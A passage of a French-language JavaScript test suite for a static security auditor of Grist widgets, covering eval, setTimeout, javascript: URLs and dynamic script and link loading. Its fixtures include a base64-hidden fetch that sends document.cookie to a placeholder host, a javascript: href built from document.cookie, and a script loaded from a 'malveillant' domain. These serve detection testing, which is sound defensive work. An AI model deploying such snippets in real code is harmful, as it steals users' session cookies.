  const ctx = { fichiers: [fichier('app.js', 'setTimeout(() => rafraichir(), 1000);')] };
  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-04').length, 0);
});

test('C-XSS-04 : setTimeout(nomDeFonctionDéclaréeDansCeFichier, délai) ne déclenche rien', () => {
  const ctx = { fichiers: [fichier('app.js', 'function rafraichir() { console.log(1); }\nsetTimeout(rafraichir, 1000);')] };
  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-04').length, 0);
});

test("C-XSS-04 : setTimeout(callback, délai) où callback est un PARAMÈTRE (motif le plus courant dans du code embarqué type lodash) reçoit un palier « à vérifier », pas le silence ni une critique systématique", () => {
  const ctx = { fichiers: [fichier('app.js', 'function armer(callback, delai) { setTimeout(callback, delai); }')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c, "un paramètre ne résout ni vers une fonction déclarée ni vers un littéral dans ce seul fichier : ni silence ni faux positif");
  assert.equal(c.severite, 'majeur');
  assert.equal(c.bloquant, false);
  assert.equal(c.confiance, 'a_verifier');
});

test("C-XSS-04 : setTimeout(atob(littéral), délai) n'est plus silencieux — Chromium compile la chaîne décodée comme du code, exactement comme un littéral direct", () => {
  const payload = Buffer.from("fetch('https://exemple-tiers.example/vole?c='+document.cookie)").toString('base64');
  const ctx = { fichiers: [fichier('app.js', `setTimeout(atob("${payload}"), 500);`)] };
  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(construction, "avant ce correctif, atob(...) n'était reconnu par aucune des trois formes attendues (Literal/TemplateLiteral/BinaryExpression) : silence total");
  assert.equal(construction.severite, 'mineur', "le contenu décodé est un littéral qui se parse : audité comme le reste du dépôt");
  const fetchExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-02' && x.fichier.includes('code littéral'));
  assert.ok(fetchExterne, "le VRAI risque (fetch vers un domaine externe, construit par concaténation) doit ressortir dans le contenu décodé");
});

test('C-XSS-04 : setTimeout(atob(calculé), délai) reste critique — rien à décoder statiquement', () => {
  const ctx = { fichiers: [fichier('app.js', 'setTimeout(atob(chargeUtile), 500);')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c);
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test('C-XSS-04 : setTimeout("al" + "ert(1)", délai) — concaténation de CONSTANTES — est plié en littéral, pas traité comme « calculé »', () => {
  const ctx = { fichiers: [fichier('app.js', 'setTimeout("al" + "ert(1)", 10);')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c);
  assert.equal(c.severite, 'mineur', "'al'+'ert(1)' est entièrement déterminé à la lecture, ce n'est pas une inconnue calculée à l'exécution");
});

test("C-XSS-04 : setTimeout(variable, délai) où variable est concaténée avec du contenu dynamique reste critique (équivalent à eval, comme avant, mais désormais avec ce statut plutôt qu'un simple majeur)", () => {
  const ctx = { fichiers: [fichier('app.js', 'setTimeout("javascript:" + suffixeVariable, 10);')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c, "aligné sur eval() : une chaîne passée à setTimeout doit être traitée à l'identique, pas à une sévérité inférieure sans raison de sécurité réelle");
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

// ---------------------------------------------------------------------------
// C-GRIST / C-STOCK-01 : le code littéral matérialisé doit entrer dans
// l'analyse du WIDGET ENTIER, pas seulement dans celle de son propre
// fragment (déjà exclue pour C-GRIST, à raison) — sans quoi cacher un appel
// dangereux dans un eval() le rend invisible aux règles qui portent sur
// l'ensemble de la surface, ou consultent un autre fichier (le README).
// Invariant que doit vérifier tout cas de ce genre : pour un code X, le
// cacher dans eval("X") ne doit jamais donner une meilleure note que X écrit
// en clair, ni produire de faux constat.
// ---------------------------------------------------------------------------

test("C-GRIST : un accès full + une action de schéma cachés dans eval() sont vus exactement comme en clair (même sévérité C-GRIST-03/04, plus aucun angle mort, et surtout AUCUN faux constat C-GRIST-01/02)", () => {
  const payload = "grist.ready({requiredAccess:'full'}); grist.docApi.applyUserActions([['RemoveTable','T']]);";
  const cache = { fichiers: [fichier('app.js', `eval(${JSON.stringify(payload)});`)], entrees: ['app.js'] };
  preparerCodeExecuteEnChaine(cache);
  const constatsCaches = analyserAccesGrist(cache);

  const clair = { fichiers: [fichier('app.js', payload)], entrees: ['app.js'] };
  const constatsClair = analyserAccesGrist(clair);

  for (const regle of ['C-GRIST-03', 'C-GRIST-04']) {
    const c = constatsCaches.find((x) => x.regle === regle);
    const e = constatsClair.find((x) => x.regle === regle);
    assert.ok(c, `${regle} doit se déclencher même quand l'appel est caché dans eval()`);
    assert.ok(e, `${regle} doit se déclencher en clair (référence)`);
    assert.equal(c.severite, e.severite, `${regle} : cacher dans eval() ne doit jamais donner une meilleure sévérité qu'en clair`);
  }

  // Vérification indépendante de l'ABSENCE, pas seulement de la sévérité par
  // égalité : un mutant qui réintroduirait l'ancien faux C-GRIST-01
  // (« n'appelle jamais grist.ready() », alors qu'il est appelé — caché dans
  // eval() — ou l'ancien faux C-GRIST-02 (accès non déclaré, alors qu'il
  // l'est) passerait la seule comparaison de sévérité ci-dessus si ces règles
  // se déclenchaient AUSSI en clair par erreur — ce test les exclut dans les
  // deux versions, indépendamment l'une de l'autre.
  for (const constats of [constatsCaches, constatsClair]) {
    assert.equal(constats.filter((x) => x.regle === 'C-GRIST-01').length, 0, "grist.ready() est bien appelé : C-GRIST-01 ne doit jamais se déclencher ici, caché ou non");
    assert.equal(constats.filter((x) => x.regle === 'C-GRIST-02').length, 0, "requiredAccess est bien déclaré : C-GRIST-02 ne doit jamais se déclencher ici, caché ou non");
  }
});

test("C-STOCK-01 : eval(\"localStorage.setItem(...)\") voit le même README que le code en clair (mineur dans les deux cas, pas majeur caché) — et reste majeur sans README, preuve que la règle regarde bien le README plutôt que de toujours répondre mineur", () => {
  const payload = "localStorage.setItem('theme', 'dark');";
  const readme = fichier('README.md', 'Ce widget utilise localStorage pour mémoriser le thème choisi.');

  const cache = { fichiers: [fichier('app.js', `eval(${JSON.stringify(payload)});`), readme] };
  preparerCodeExecuteEnChaine(cache);
  const constatsCache = analyserStockage(cache);
  const cCache = constatsCache.find((x) => x.regle === 'C-STOCK-01');

  const clair = { fichiers: [fichier('app.js', payload), readme] };
  const cClair = analyserStockage(clair).find((x) => x.regle === 'C-STOCK-01');

  assert.ok(cCache && cClair);
  assert.equal(constatsCache.filter((x) => x.regle === 'C-STOCK-01').length, 1, "un seul constat, ni absent ni dédoublé par le fichier synthétique");
  assert.equal(cCache.severite, 'mineur', "avant ce correctif, le fichier synthétique isolé ne voyait pas le vrai README : majeur à tort");
  assert.equal(cCache.severite, cClair.severite);

  // Contrôle négatif indépendant : sans README du tout, la même construction
  // cachée doit rester MAJEUR — sinon la règle ne distingue plus « documenté »
  // de « non documenté » et répond « mineur » sans conditions, ce que la
  // seule comparaison ci-dessus (cCache vs cClair, tous deux AVEC README) ne
  // peut pas détecter.
  const cacheSansReadme = { fichiers: [fichier('app.js', `eval(${JSON.stringify(payload)});`)] };
  preparerCodeExecuteEnChaine(cacheSansReadme);
  const cCacheSansReadme = analyserStockage(cacheSansReadme).find((x) => x.regle === 'C-STOCK-01');
  assert.equal(cCacheSansReadme.severite, 'majeur', "sans README, même caché dans eval(), doit rester majeur — la règle doit vraiment regarder le README, pas répondre mineur inconditionnellement");
});

// ---------------------------------------------------------------------------
// Numérotation de ligne du code imbriqué : le fichier synthétique porte sa
// PROPRE numérotation, jamais une ligne recalculée par rapport au fichier
// source (l'ancien `analyserSiCodeLitteral` faisait `ligne + c.ligne - 1`,
// faux dès que le littéral ne correspond pas ligne à ligne au texte source).
// ---------------------------------------------------------------------------

test("numérotation de ligne : un littéral multi-lignes qui commence au milieu d'une ligne source rapporte SA PROPRE ligne interne, pas un calcul par rapport à la ligne d'appel", () => {
  // Construit pour que les trois hypothèses possibles donnent trois valeurs
  // DIFFÉRENTES (la coordination a relevé le 2026-09-28 que la fixture
  // précédente, où la ligne d'appel et la ligne interne valaient toutes deux
  // 3, ne distinguait pas « toujours reporter la ligne d'appel » de la bonne
  // numérotation propre, les deux donnant alors 3) :
  //   - ligne d'appel (site du eval()) : 5
  //   - ligne du fetch() DANS le contenu décodé (sa propre numérotation) : 2
  //   - ancienne formule fautive (ligne d'appel + ligne interne − 1) : 5+2−1 = 6
  // Seule la bonne numérotation donne 2 ; les deux hypothèses fautives
  // donneraient 5 ou 6, toutes deux détectées comme fausses par ce test.
  const src = [
    '// l1',
    '// l2',
    '// l3',
    '// l4',
    "eval(\"a();\\nfetch('https://exemple.example/x')\");",
    '',
  ].join('\n');
  const ctx = { fichiers: [fichier('app.js', src)] };
  const construction = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03');
  assert.equal(construction.ligne, 5, "le site d'appel est bien à la ligne 5");
  const fetchExterne = analyserSortiesReseau(ctx).find((x) => x.regle === 'C-EXFIL-01');
  assert.ok(fetchExterne);
  assert.equal(fetchExterne.ligne, 2, "fetch() est à la ligne 2 DU CONTENU DÉCODÉ (a(); / fetch(...)) : ni 5 (toujours la ligne d'appel), ni 6 (5+2-1, l'ancienne formule fautive)");
  assert.ok(fetchExterne.fichier.includes('code littéral, ligne 5'), 'le nom du fichier synthétique identifie sans ambiguïté le site d\'appel dont il provient');
});

test("C-XSS-01 : createContextualFragment(chaîneDynamique) est signalé comme innerHTML dynamique", () => {
  const ctx = { fichiers: [fichier('app.js', 'const frag = range.createContextualFragment(html); conteneur.appendChild(frag);')] };
  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-01' && x.titre.includes('createContextualFragment'));
  assert.ok(c, "un fragment inséré ensuite se comporte exactement comme innerHTML dynamique");
  assert.equal(c.severite, 'majeur');
});

test("C-XSS-01 : createContextualFragment(chaîneLittéraleConstante) ne se déclenche pas", () => {
  const ctx = { fichiers: [fichier('app.js', "const frag = range.createContextualFragment('<b>x</b>');")] };
  assert.equal(analyserInjections(ctx).filter((x) => x.titre?.includes('createContextualFragment')).length, 0);
});

test("C-XSS-03 : affectation d'une URL javascript: à .href exécute du code, comme eval()", () => {
  const ctx = { fichiers: [fichier('app.js', "lien.href = 'javascript:' + document.cookie;")] };
  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('javascript:'));
  assert.ok(c, "une URL javascript: exécute son contenu comme du code, un déguisement courant pour échapper à une recherche de texte sur eval(");
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test("C-XSS-03 : setAttribute('href', 'javascript:...') est traité comme l'affectation directe", () => {
  const ctx = { fichiers: [fichier('app.js', "lien.setAttribute('href', 'javascript:alert(document.cookie)');")] };
  const c = analyserInjections(ctx).find((x) => x.regle === 'C-XSS-03' && x.titre.includes('javascript:'));
  assert.ok(c);
});

test("C-XSS-03 : une affectation .href ordinaire (pas javascript:) ne déclenche pas ce constat", () => {
  const ctx = { fichiers: [fichier('app.js', "lien.href = 'https://exemple.example/page';")] };
  assert.equal(analyserInjections(ctx).filter((x) => x.titre?.includes('javascript:')).length, 0);
});

// ---------------------------------------------------------------------------
// C-EXFIL-05 : setAttribute('src'/'href'), en plus de l'affectation directe,
// et extension à un <link> créé dynamiquement (même défaut de traçabilité
// qu'un <script>, pour un risque réel mais d'une autre nature : CSS plutôt
// que code arbitraire — d'où un cran de sévérité en dessous, jamais bloquant).
// ---------------------------------------------------------------------------

test("C-EXFIL-05 : s.setAttribute('src', urlExterne) sur un <script> créé dynamiquement est détecté comme s.src = urlExterne", () => {
  const ctx = { fichiers: [fichier('app.js', [
    "const s = document.createElement('script');",
    "s.setAttribute('src', 'https://cdn.malveillant.example/x.js');",
    'document.body.appendChild(s);',
  ].join('\n'))] };
  const c = analyserScriptDynamique(ctx).find((x) => x.regle === 'C-EXFIL-05');
  assert.ok(c);
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test("C-EXFIL-05 : un <link> créé dynamiquement et pointé en externe est détecté, en majeur non bloquant (pas comme un <script>)", () => {
  const ctx = { fichiers: [fichier('app.js', [
    "const l = document.createElement('link');",
    "l.href = 'https://cdn.exemple.example/style.css';",
    'document.head.appendChild(l);',
  ].join('\n'))] };
  const c = analyserScriptDynamique(ctx).find((x) => x.regle === 'C-EXFIL-05');
  assert.ok(c, "un <link> externe est un risque réel (exfiltration CSS) mais d'une autre nature qu'un <script>");
  assert.equal(c.severite, 'majeur');
  assert.equal(c.bloquant, false, "jamais bloquant à lui seul, contrairement à un <script> : le risque n'est pas l'exécution de code arbitraire");
});

test("C-EXFIL-05 : l.setAttribute('href', urlExterne) sur un <link> créé dynamiquement est aussi détecté", () => {
  const ctx = { fichiers: [fichier('app.js', [
    "const l = document.createElement('link');",
    "l.setAttribute('href', 'https://cdn.exemple.example/style.css');",
  ].join('\n'))] };
  const c = analyserScriptDynamique(ctx).find((x) => x.regle === 'C-EXFIL-05');
  assert.ok(c);
  assert.equal(c.severite, 'majeur');
});

test("C-EXFIL-05 : un <link> local ou Grist ne déclenche rien", () => {
  const ctx = { fichiers: [fichier('app.js', [
    "const l = document.createElement('link');",
    "l.href = '/style.css';",
  ].join('\n'))] };
  assert.equal(analyserScriptDynamique(ctx).filter((x) => x.regle === 'C-EXFIL-05').length, 0);
});

// ---------------------------------------------------------------------------
// Cas concret qui a motivé la distinction littéral/calculé : Function("return
// this") est l'idiome lodash (bundlé par l'API Grist elle-même, node_modules/
// lodash/_root.js) pour obtenir l'objet global, prédatant globalThis — une
// chaîne figée, lisible, qui ne touche ni donnée ni réseau. Le classer
// critique+bloquant faisait passer widget-exemple (qui embarque l'API Grist,
// suivant le conseil de C-EXFIL-04) de CONFORME à NON CONFORME pour un idiome
// sans rapport avec une vraie faille.
// ---------------------------------------------------------------------------

test('C-XSS-03 : Function("return this") (idiome lodash de détection du global) ne produit qu\'un rappel mineur, jamais bloquant', () => {
  const contenu = [
    'var freeGlobal = typeof global == "object" && global && global.Object === Object && global;',
    'var freeSelf = typeof self == "object" && self && self.Object === Object && self;',
    'var root = freeGlobal || freeSelf || Function("return this")();',
  ].join('\n');
  const ctx = { fichiers: [fichier('grist-plugin-api.js', contenu)] };
  const constats = preparerCodeExecuteEnChaine(ctx);
  const c = constats.find((x) => x.regle === 'C-XSS-03');
  assert.ok(c);
  assert.equal(c.severite, 'mineur');
  assert.equal(c.bloquant, false);
  assert.equal(constats.some((x) => x.bloquant), false, "aucun constat bloquant : ce fichier ne doit plus, à lui seul, faire échouer la conformité");
});

// ---------------------------------------------------------------------------
// D1/D2 (relevés par la coordination le 2026-09-28, seconde vérification
// indépendante de c4c57ba puis de 5e79a2c) : la résolution d'un identifiant
// vers un littéral ou une fonction ne doit valoir que pour une liaison
// VISIBLE depuis le site d'appel et JAMAIS réaffectée. L'ancienne résolution
// (recherche globale dans tout le fichier, sans portée ni vérification de
// réaffectation) laissait `let code = 'void 0'; code = donnee; eval(code)`
// résolu vers `'void 0'`, et le premier ou dernier `var code = …` du fichier
// l'emportait quelle que soit sa portée réelle — un widget malveillant
// masquant son contenu derrière une variable réaffectée notait alors MIEUX
// qu'écrit en clair (axe D réel : CONFORME 89 au lieu de NON CONFORME ~75),
// ce que l'invariant du projet interdit explicitement.
// ---------------------------------------------------------------------------

test("C-XSS-03 (D1) : eval(code) où code est une var RÉAFFECTÉE puis REDÉCLARÉE plus loin dans le fichier doit être traité comme calculé à l'exécution, pas résolu vers l'une ou l'autre valeur", () => {
  const ctx = { fichiers: [fichier('app.js', 'var code = "1+1"; eval(code); var code = "2+2";')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03');
  assert.ok(c);
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
  assert.ok(c.constat.includes('calculé'), "une var redéclarée ailleurs dans le fichier n'est pas une valeur fiable : ni « 1+1 » ni « 2+2 » ne doit être pris pour argent comptant");
});

test("C-XSS-03 (D1) : eval(code) où code est un let réaffecté depuis une donnée d'enregistrement Grist avant l'appel doit être traité comme calculé à l'exécution, pas résolu vers sa valeur initiale", () => {
  const contenu = "function surRecord(r) { let code = 'void 0'; code = r.Formule; eval(code); }";
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03');
  assert.ok(c, "avant ce correctif, `code` résolvait à tort vers son affectation initiale 'void 0' : ce cas restait invisible");
  assert.equal(c.severite, 'critique');
  assert.equal(c.bloquant, true);
});

test("C-XSS-03 (D1, témoin) : eval(code) où code est un const JAMAIS réaffecté ni redéclaré reste résolu vers son littéral (le correctif ne doit pas punir le cas honnête)", () => {
  const ctx = { fichiers: [fichier('app.js', 'const code = "1+1"; eval(code);')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-03');
  assert.ok(c);
  assert.equal(c.severite, 'mineur', "un const jamais réaffecté est une liaison fiable : son contenu doit rester audité comme un littéral direct");
  assert.equal(c.bloquant, false);
});

test("C-XSS-04 (D2) : new Promise(resolve => { resolve = donnée; setTimeout(resolve, délai); }) doit produire un constat — resolve réaffecté n'est plus garanti être une fonction", () => {
  const ctx = { fichiers: [fichier('app.js', 'new Promise(resolve => { resolve = window.name; setTimeout(resolve, 0); });')] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c, "avant ce correctif, l'exemption « exécuteur de Promise » couvrait resolve même réaffecté : silence total malgré un contenu qui n'est plus garanti être une fonction");
  assert.equal(c.severite, 'majeur');
  assert.equal(c.bloquant, false);
});

test("C-XSS-04 (D2, témoin) : new Promise(resolve => { setTimeout(resolve, délai); }) sans réaffectation reste silencieux (l'idiome d'attente le plus courant ne doit rien produire)", () => {
  const ctx = { fichiers: [fichier('app.js', 'new Promise(resolve => { setTimeout(resolve, 0); });')] };
  assert.equal(preparerCodeExecuteEnChaine(ctx).filter((x) => x.regle === 'C-XSS-04').length, 0);
});

// ---------------------------------------------------------------------------
// 2a (conséquence directe de la même analyse de portée) : une liaison plus
// proche du site d'appel — variable de bloc, paramètre déstructuré, à valeur
// par défaut, ou de catch — doit masquer une fonction homonyme déclarée
// ailleurs dans le fichier, jamais l'inverse. L'ancienne recherche ne
// reconnaissait qu'un paramètre `Identifier` simple comme masquant ; toute
// autre forme de liaison locale laissait la recherche globale trouver, à
// tort, la fonction homonyme du fichier.
// ---------------------------------------------------------------------------

test("C-XSS-04 (2a) : setTimeout(cb, délai) où cb est une variable LOCALE homonyme d'une fonction déclarée ailleurs dans le fichier doit être « à vérifier », pas résolu vers cette fonction sans rapport", () => {
  const contenu = 'function cb() { return 1; }\nfunction armer() { const cb = window.name; setTimeout(cb, 10); }';
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c, "avant ce correctif, la variable locale `cb` était masquée par la fonction homonyme du fichier trouvée par une recherche globale sans portée : silence à tort");
  assert.equal(c.severite, 'majeur');
  assert.equal(c.confiance, 'a_verifier');
});

test("C-XSS-04 (2a) : setTimeout(cb, délai) où cb est un paramètre DÉSTRUCTURÉ homonyme d'une fonction déclarée ailleurs doit être « à vérifier », pas résolu vers cette fonction", () => {
  const contenu = 'function cb() { return 1; }\nfunction armer({cb}) { setTimeout(cb, 10); }';
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c, "un paramètre déstructuré n'était pas reconnu par l'ancienne recherche (qui ne testait que p.type === 'Identifier'), laissant la fonction homonyme du fichier résoudre à tort");
  assert.equal(c.severite, 'majeur');
});

test("C-XSS-04 (2a) : setTimeout(cb, délai) où cb est un paramètre à valeur PAR DÉFAUT homonyme d'une fonction déclarée ailleurs doit être « à vérifier »", () => {
  const contenu = 'function cb() { return 1; }\nfunction armer(cb = window.name) { setTimeout(cb, 10); }';
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c);
  assert.equal(c.severite, 'majeur');
});

test("C-XSS-04 (2a) : setTimeout(cb, délai) où cb est le paramètre d'un catch homonyme d'une fonction déclarée ailleurs doit être « à vérifier »", () => {
  const contenu = 'function cb() { return 1; }\nfunction armer() { try {} catch (cb) { setTimeout(cb, 10); } }';
  const ctx = { fichiers: [fichier('app.js', contenu)] };
  const c = preparerCodeExecuteEnChaine(ctx).find((x) => x.regle === 'C-XSS-04');
  assert.ok(c);
  assert.equal(c.severite, 'majeur');
});
